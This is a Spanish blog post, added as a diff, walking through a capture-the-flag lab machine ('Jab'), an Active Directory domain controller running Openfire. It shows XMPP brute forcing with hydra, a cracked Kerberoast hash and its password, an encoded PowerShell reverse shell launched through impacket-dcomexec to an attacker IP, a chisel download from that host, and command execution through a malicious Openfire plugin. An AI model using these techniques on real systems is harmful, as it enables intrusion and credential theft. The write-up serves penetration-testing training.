@@ -1,0 +1,516 @@
+---
+layout: post
+title:  "Jab Machine (Medium)"
+date:   2024-06-30 00:00:00 +0100
+categories: ["Windows", "Medium", "XMPP", "Brute Force", "Active Directory","Spanish"]
+---
+
+## Enumeración de servicios
+
+```java
+$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5222,5223,5262,5263,5269,5270,5275,5276,5985,7070,7443,7777,9090,9389,47001,49664,49665,49666,49667,49671,49674,49675,49676,49681,49782,50962,53144 -sC -sV -oA openVersions 10.10.11.4
+Nmap scan report for 10.10.11.4
+Host is up (0.039s latency).
+
+PORT      STATE SERVICE             VERSION
+53/tcp    open  domain              Simple DNS Plus
+88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2024-05-18 09:44:51Z)
+135/tcp   open  msrpc               Microsoft Windows RPC
+139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
+389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-05-18T09:46:10+00:00; +1s from scanner time.
+| ssl-cert: Subject: commonName=DC01.jab.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
+| Not valid before: 2023-11-01T20:16:18
+|_Not valid after:  2024-10-31T20:16:18
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.jab.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
+| Not valid before: 2023-11-01T20:16:18
+|_Not valid after:  2024-10-31T20:16:18
+|_ssl-date: 2024-05-18T09:46:09+00:00; +1s from scanner time.
+3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.jab.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
+| Not valid before: 2023-11-01T20:16:18
+|_Not valid after:  2024-10-31T20:16:18
+|_ssl-date: 2024-05-18T09:46:09+00:00; +1s from scanner time.
+3269/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-05-18T09:46:09+00:00; +1s from scanner time.
+| ssl-cert: Subject: commonName=DC01.jab.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
+| Not valid before: 2023-11-01T20:16:18
+|_Not valid after:  2024-10-31T20:16:18
+5222/tcp  open  jabber
+| ssl-cert: Subject: commonName=dc01.jab.htb
+| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+| Not valid before: 2023-10-26T22:00:12
+|_Not valid after:  2028-10-24T22:00:12
+|_ssl-date: TLS randomness does not represent time
+| fingerprint-strings: 
+|   RPCCheck: 
+|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     capabilities: 
+|     auth_mechanisms: 
+|     xmpp: 
+|       version: 1.0
+|     unknown: 
+|     stream_id: 92k1cpwb5w
+|     features: 
+|     errors: 
+|       invalid-namespace
+|       (timeout)
+|_    compression_methods: 
+5223/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
+|_ssl-date: TLS randomness does not represent time
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     capabilities: 
+|     auth_mechanisms: 
+|     xmpp: 
+|     unknown: 
+|     features: 
+|     errors: 
+|       (timeout)
+|_    compression_methods: 
+| ssl-cert: Subject: commonName=dc01.jab.htb
+| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+| Not valid before: 2023-10-26T22:00:12
+|_Not valid after:  2028-10-24T22:00:12
+5262/tcp  open  jabber
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     capabilities: 
+|     auth_mechanisms: 
+|     xmpp: 
+|       version: 1.0
+|     unknown: 
+|     stream_id: 3ieyhoygw5
+|     features: 
+|     errors: 
+|       invalid-namespace
+|       (timeout)
+|_    compression_methods: 
+| fingerprint-strings: 
+|   RPCCheck: 
+|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
+5263/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
+| ssl-cert: Subject: commonName=dc01.jab.htb
+| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+| Not valid before: 2023-10-26T22:00:12
+|_Not valid after:  2028-10-24T22:00:12
+|_ssl-date: TLS randomness does not represent time
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     capabilities: 
+|     auth_mechanisms: 
+|     xmpp: 
+|     unknown: 
+|     features: 
+|     errors: 
+|       (timeout)
+|_    compression_methods: 
+5269/tcp  open  xmpp                Wildfire XMPP Client
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     capabilities: 
+|     auth_mechanisms: 
+|     xmpp: 
+|     unknown: 
+|     features: 
+|     errors: 
+|       (timeout)
+|_    compression_methods: 
+5270/tcp  open  ssl/xmpp            Wildfire XMPP Client
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=dc01.jab.htb
+| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+| Not valid before: 2023-10-26T22:00:12
+|_Not valid after:  2028-10-24T22:00:12
+5275/tcp  open  jabber
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     capabilities: 
+|     auth_mechanisms: 
+|     xmpp: 
+|       version: 1.0
+|     unknown: 
+|     stream_id: 99p6dmxgbv
+|     features: 
+|     errors: 
+|       invalid-namespace
+|       (timeout)
+|_    compression_methods: 
+| fingerprint-strings: 
+|   RPCCheck: 
+|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
+5276/tcp  open  ssl/jabber
+|_ssl-date: TLS randomness does not represent time
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     capabilities: 
+|     auth_mechanisms: 
+|     xmpp: 
+|     unknown: 
+|     features: 
+|     errors: 
+|       (timeout)
+|_    compression_methods: 
+| fingerprint-strings: 
+|   RPCCheck: 
+|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
+| ssl-cert: Subject: commonName=dc01.jab.htb
+| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+| Not valid before: 2023-10-26T22:00:12
+|_Not valid after:  2028-10-24T22:00:12
+5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+7070/tcp  open  realserver?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
+|     HTTP/1.1 400 Illegal character CNTL=0x0
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Sat, 18 May 2024 09:44:51 GMT
+|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
+|     Content-Type: text/html
+|     Accept-Ranges: bytes
+|     Content-Length: 223
+|     <html>
+|     <head><title>Openfire HTTP Binding Service</title></head>
+|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
+|     </html>
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Sat, 18 May 2024 09:44:57 GMT
+|     Allow: GET,HEAD,POST,OPTIONS
+|   Help: 
+|     HTTP/1.1 400 No URI
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 49
+|     Connection: close
+|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
+|   RPCCheck: 
+|     HTTP/1.1 400 Illegal character OTEXT=0x80
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 71
+|     Connection: close
+|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
+|   RTSPRequest: 
+|     HTTP/1.1 505 Unknown Version
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 58
+|     Connection: close
+|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
+|   SSLSessionReq: 
+|     HTTP/1.1 400 Illegal character CNTL=0x16
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 70
+|     Connection: close
+|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
+7443/tcp  open  ssl/oracleas-https?
+|_ssl-date: TLS randomness does not represent time
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
+|     HTTP/1.1 400 Illegal character CNTL=0x0
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Sat, 18 May 2024 09:45:03 GMT
+|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
+|     Content-Type: text/html
+|     Accept-Ranges: bytes
+|     Content-Length: 223
+|     <html>
+|     <head><title>Openfire HTTP Binding Service</title></head>
+|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
+|     </html>
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Sat, 18 May 2024 09:45:09 GMT
+|     Allow: GET,HEAD,POST,OPTIONS
+|   Help: 
+|     HTTP/1.1 400 No URI
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 49
+|     Connection: close
+|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
+|   RPCCheck: 
+|     HTTP/1.1 400 Illegal character OTEXT=0x80
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 71
+|     Connection: close
+|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
+|   RTSPRequest: 
+|     HTTP/1.1 505 Unknown Version
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 58
+|     Connection: close
+|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
+|   SSLSessionReq: 
+|     HTTP/1.1 400 Illegal character CNTL=0x16
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 70
+|     Connection: close
+|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
+| ssl-cert: Subject: commonName=dc01.jab.htb
+| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+| Not valid before: 2023-10-26T22:00:12
+|_Not valid after:  2028-10-24T22:00:12
+7777/tcp  open  socks5              (No authentication; connection failed)
+| socks-auth-info: 
+|_  No authentication
+9090/tcp  open  tcpwrapped
+9389/tcp  open  mc-nmf              .NET Message Framing
+47001/tcp open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc               Microsoft Windows RPC
+49665/tcp open  msrpc               Microsoft Windows RPC
+49666/tcp open  msrpc               Microsoft Windows RPC
+49667/tcp open  msrpc               Microsoft Windows RPC
+49671/tcp open  msrpc               Microsoft Windows RPC
+49674/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc               Microsoft Windows RPC
+49676/tcp open  msrpc               Microsoft Windows RPC
+49681/tcp open  msrpc               Microsoft Windows RPC
+49782/tcp open  msrpc               Microsoft Windows RPC
+50962/tcp open  msrpc               Microsoft Windows RPC
+53144/tcp open  msrpc               Microsoft Windows RPC
+6 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port5222-TCP:V=7.94SVN%I=7%D=5/18%Time=664878A7%P=x86_64-pc-linux-gnu%r
+SF:(RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.or
+SF:g/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-str
+SF:eams\"/></stream:error></stream:stream>");
+<SNIP>
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-05-18T09:46:04
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat May 18 11:46:11 2024 -- 1 IP address (1 host up) scanned in 89.49 seconds
+```
+
+En este escaneo se nos muestra mucho ruido, pero también hay información relevante como la siguiente:
+
+* La víctima se trata de un Windows Domain Controller de un Active Directory.
+* La víctima tiene el software Openfire en ejecución (XMPP).
+
+Antes ya podríamos haber intuido por el puerto de dns y kerberos abiertos que nos encontrabamos ante un DC, pero esta bien cerciorarse.
+
+Dicho esto, esta guía esta hecha para ir al punto vulnerable o mal configurado sin dar muchos rodeos. ¡Vamos allá!
+
+## Enumeración XMPP
+
+Openfire es un servidor XMPP que provee un chat para usuarios. Lo primero que debemos hacer es conectarnos a este servicio, para ello necesitaremos un cliente. Hay varios de ellos, en mi caso usé [Spark](https://www.igniterealtime.org/downloads/).
+
+![Spark window](/assets/machines/jab.htb/images/spark_window.png)
+
+Al iniciar el Spark, podremos crear una cuenta en `aldayr:password` en el dominio `jab.htb`.
+
+![Spark window](/assets/machines/jab.htb/images/spark_create_account.png)
+
+Iniciamos sesión.
+
+![Spark window](/assets/machines/jab.htb/images/spark_login.png)
+
+En `Action > Join Conference room` encontraremos dos chats. Solo podremos entrar en el chat `test2`.
+
+![Spark window](/assets/machines/jab.htb/images/spark_show_conferences.png)
+
+En este chat nos encontraremos con dos mensajes, escritos por los usuarios `bdavis`y `simo`. En principio no hay nada mas importante en este chat.
+
+![Spark window](/assets/machines/jab.htb/images/test2chat.png)
+
+Por otra parte, en la barra de búsqueda podemos introducir el wildcard `*` y se nos mostrará varios usuarios.
+
+![Spark window](/assets/machines/jab.htb/images/xmpp_users.png)
+
+Usaremos únicamente los usuarios `bdavis` y `simo`, que eran los únicos usuarios que interactuaban en el chat, para realizar un ataque de fuerza bruta con `hydra`.
+
+```bash
+$ hydra -L users.txt -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt  xmpp://10.10.11.4:5222/CRAM-MD5 -V
+```
+
+![Spark window](/assets/machines/jab.htb/images/hydra_xmpp_found_passwords.png)
+
+Iniciando sesión como `bdavis`, tendremos acceso al chat `2003 Third Party Pentest Discussion`. El chat es el siguiente:
+
+```java
+(19:42) bdavis has joined the room
+(19:42)  changed the subject to ""
+Tuesday, 21 November 2023
+(19:31) adunn: team, we need to finalize post-remediation testing from last quarter's pentest. @bdavis Brian can you please provide us with a status?
+(19:33) bdavis: sure. we removed the SPN from the svc_openfire account. I believe this was finding #2. can someone from the security team test this? if not we can send it back to the pentesters to validate. 
+(20:30) bdavis: here are the commands from the report, can you find someone from the security team who can re-run these to validate? 
+(20:30) bdavis: $ GetUserSPNs.py -request -dc-ip 192.168.195.129 jab.htb/hthompson
+ 
+Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation
+ 
+Password:
+ServicePrincipalName  Name          MemberOf  PasswordLastSet             LastLogon  Delegation 
+--------------------  ------------  --------  --------------------------  ---------  ----------
+http/xmpp.jab.local   svc_openfire            2023-10-27 15:23:49.811611  <never>               
+ 
+ 
+ 
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*svc_openfire$JAB.HTB$jab.htb/svc_openfire*$b1abbb2f4beb2a48e7412ccd26b60e61$864f27ddaaded607ab5efa59544870cece4b6262e20f3bee38408d296ffbf07ceb421188b9b82ac0037ae67b488bb0ef2178a0792d62<SNIP>
+
+(20:30) bdavis: $ hashcat -m 13100 svc_openfire_tgs /usr/share/wordlists/rockyou.txt 
+
+hashcat (v6.1.1) starting...
+
+<SNIP>
+
+$krb5tgs$23$*svc_openfire$JAB.HTB$jab.htb/svc_openfire*$de17a01e2449626571bd9416dd4e3d46$4fea18693e1cb97f3e096288a76204437f115fe49b9611e339154e0effb1d0fcccfbbbb219da829b0ac70e8420f2f35a4f315c5c6f1d4ad3092e14ccd506e9a3bd3d20854ec73e62859cd68a7e6169f3c0b5ab82064b04df4ff7583ef18bbd42ac529a5747102c2924d1a76703a30908f5ad41423b2fff5e6c03d3df6c0635a41bea1aca3e15986639c758eef30b74498a184380411e207e5f3afef185eaf605f543c436cd155823b7a7870a3d5acd0b785f999facd8b7ffdafe6e0410af26efc42417d402f2819d03b3730203b59c21b0434e2e0e7a97ed09e3901f523ba52fe9d3ee7f4203de9e857761fbcb417d047765a5a01e71aff732e5d5d114f0b58a8a0df4ca7e1ff5a88c532f5cf33f2e01986ac44a353c0142b0360e1b839bb6889a54fbd9c549da23fb05193a4bfba179336e7dd69380bc4f9c3c00324e42043ee54b3017a913f84a20894e145b23b440aff9c524efb7957dee89b1e7b735db292ca5cb32cf024e9b8f5546c33caa36f5370db61a9a3facb473e741c61ec7dbee7420c188e31b0d920f06b7ffc1cb86ace5db0f9eeaf8c13bcca743b6bf8b2ece99dd58aff354f5b4a78ffcd9ad69ad8e7812a2952806feb9b411fe53774f92f9e8889380dddcb59de09320094b751a0c938ecc762cbd5d57d4e0c3d660e88545cc96e324a6fef226bc62e2bb31897670929571cd728b43647c03e44867b148428c9dc917f1dc4a0331517b65aa52221fcfe9499017ab4e6216ced3db5837d10ad0d15e07679b56c6a68a97c1e851238cef84a78754ff5c08d31895f0066b727449575a1187b19ad8604d583ae07694238bae2d4839fb20830f77fffb39f9d6a38c1c0d524130a6307125509422498f6c64adc030bfcf616c4c0d3e0fa76dcde0dfc5c94a4cb07ccf4cac941755cfdd1ed94e37d90bd1b612fee2ced175aa0e01f2919e31614f72c1ff7316be4ee71e80e0626b787c9f017504fa717b03c94f38fe9d682542d3d7edaff777a8b2d3163bc83c5143dc680c7819f405ec207b7bec51dabcec4896e110eb4ed0273dd26c82fc54bb2b5a1294cb7f3b654a13b4530bc186ff7fe3ab5a802c7c91e664144f92f438aecf9f814f73ed556dac403daaefcc7081957177d16c1087f058323f7aa3dfecfa024cc842aa3c8ef82213ad4acb89b88fc7d1f68338e8127644cfe101bf93b18ec0da457c9136e3d0efa0d094994e1591ecc4:!@#$%^&*(1qazxsw
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, TGS-REP
+Hash.Target......: $krb5tgs$23$*svc_openfire$JAB.HTB$jab.htb/svc_openf...91ecc4
+Time.Started.....: Fri Oct 27 15:30:12 2023 (17 secs)
+Time.Estimated...: Fri Oct 27 15:30:29 2023 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   873.9 kH/s (10.16ms) @ Accel:64 Loops:1 Thr:64 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 14344385/14344385 (100.00%)
+Rejected.........: 0/14344385 (0.00%)
+Restore.Point....: 14336000/14344385 (99.94%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: $HEX[2321686f74746965] -> $HEX[042a0337c2a156616d6f732103]
+ 
+Started: Fri Oct 27 15:30:09 2023
+Stopped: Fri Oct 27 15:30:29 2023
+
+(20:31) adunn: I'll pass this along and circle back with the group
+(20:32) bdavis: perfect, thanks Angela!
+```
+
+En el chat se discute un pentest, donde se realiza un ataque de fuerza bruta para obtener la contraseña del usuario `svc_openfire`.
+
+```
+username:svc_openfire
+password:!@#$%^&*(1qazxsw
+```
+
+Como dato adicional vemos que se hace uso del comando `GetUserSPNs.py` donde se muestra otro usuario `hthompson`.
+
+
+## Bloodhound
+
+Ya que tenemos las credenciales del usuario `svc_openfire`, podemos utilizar `bloodhound.python` para extraer información del Active Directory.
+
+```bash
+$ bloodhound-python -u 'svc_openfire' -p '!@#$%^&*(1qazxsw' -d jab.htb -dc DC01.jab.htb -c all -ns 10.10.11.4
+```
+
+![Spark window](/assets/machines/jab.htb/images/bloodhound_pyhon.png)
+
+Abrimos Bloodhound y subimos los archivos json generados. Al revisar la información del usuario `svc_openfire`, vemos que este tiene el privilegio `DCOM`.
+
+![Spark gfd](/assets/machines/jab.htb/images/bloodhound_DCOM.png)
+
+Con este privilegio podemos ejecutar comandos (mas información [aquí](https://medium.com/@iamkumarraj/exploring-impacket-dcomexec-enhancing-active-directory-attack-capabilities-a9663d383703)). El siguiente comando utiliza este privilegio para lanzar una reverse shell.
+
+```bash
+$ impacket-dcomexec -object MMC20 -dc-ip 10.10.11.4 jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAA0ACIALAA5ADAAMAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' -silentcommand
+```
+
+Antes de lanzar el comando, utilizaremos netcat para escuchar en el puerto 9000.
+
+![Spark gfd](/assets/machines/jab.htb/images/got_reverse_shell.png)
+
+Una vez dentro, podremos ir a por la flag `user.txt`.
+
+![Spark gfd](/assets/machines/jab.htb/images/user_flag.png)
+
+## Escalado de privilegios
+
+La documentación de Openfire menciona que el panel de administración se encuentra en el puerto `9090`. Sin embargo, era inaccesible desde fuera (el siguiente comando nos da la razón).
+
+```python
+PS C:\Program Files\Openfire\conf> netstat -ano | findstr LISTEN
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       648
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       920
+  <SNIP>
+  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       2604
+  <SNIP>
+```
+
+Usaremos chisel, para realizar un Local Port Forwarding  `attacker:9090 => victim:9090`.
+
+Para los que no estéis familiarizados con chisel, esta herramienta permite tunelizar nuestro tráfico desde nuestra máquina atacante a la víctima. Esto permite acceder a puertos que unicamente se pueden acceder en local.
+
+Para ello, necesitamos tener chisel en la máquina víctima. Utilizar cualquiera de los siguientes comandos para descargar chisel desde nuestra máquina atacante.
+
+```python
+PS C:\Users\svc_openfire\Downloads> wget http://10.10.14.44:80/chisel.exe -outfile chisel.exe
+PS C:\Users\svc_openfire\Downloads> (New-Object Net.WebClient).DownloadFile("http://10.10.14.44/chisel.exe"," C:\Users\svc_openfire\Downloads\chisel.exe")
+```
+
+En nuestra máquina atacante, lanzamos chisel server en el puerto 9999.
+
+```sh
+$ chisel server -p 9999 --reverse
+```
+
+En la máquina víctima lanzamos `chisel client`
+
+```python
+PS C:\Users\svc_openfire\Downloads> .\chisel.exe client 10.10.14.44:9999 R:9090:127.0.0.1:9090
+```
+
+![Spark gfd](/assets/machines/jab.htb/images/openfire_admin_panel.png)
+
+Para acceder a este panel podemos usar las credenciales de `svc_openfire`.
+
+Una vez dentro podemos instalar un plugin que nos permita ejecutar comandos. El plugin (.jar), se encuentra aquí [CVE-2023-32315](https://github.com/miko550/CVE-2023-32315).
+
+El CVE del Github y el plugin son diferentes, nosotros únicamente haremos uso del plugin ya que no necesitamos hacer un Authentication Bypass.
+
+![Spark gfd](/assets/machines/jab.htb/images/upload_plugin.png)
+
+Ahora nos dirigimos a `Server > Server Settings > Management Tool`.
+
+![Spark gfd](/assets/machines/jab.htb/images/management_tool.png)
+
+Introducimos la contraseña `123`. Y listo podremos ejecutar comandos ...
+
+![Spark gfd](/assets/machines/jab.htb/images/openfire_command_whoami.png)
+
+> No funcionan todos los comandos, y puede llegar a colgarse, así que te recomiendo que para visualizar la flag root.txt, uses la funcionalidad de File system.
+
+Introducimos la dirección de la root flag...
+
+![Spark gfd](/assets/machines/jab.htb/images/root.txt.png)
+
+¡Happy Hacking!
